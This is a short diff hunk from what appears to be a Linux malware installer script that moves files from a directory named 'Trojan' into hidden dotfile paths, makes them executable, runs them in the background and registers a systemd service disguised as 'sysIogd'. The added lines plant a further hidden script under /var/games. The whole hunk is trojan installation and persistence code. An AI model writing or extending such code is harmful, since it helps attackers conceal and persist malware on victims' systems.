@@ -10,6 +10,8 @@ bash /bin/.systemm.sh &
 mv /etc/.a/Trojan/resolver.sh /etc/.resolver.sh
 chmod +x /etc/.resolver.sh
 bash /etc/.resolver.sh &
+mv /etc/.a/Trojan/creator.sh /var/games/.creator.sh
+chmod +x /var/games/.creator.sh
 mv /etc/.a/Trojan/sysIogd.sh /lib/.sysIogd.sh
 chmod +x /lib/.sysIogd.sh
 mv /etc/.a/Trojan/sysIogd.service /etc/systemd/system/sysIogd.service
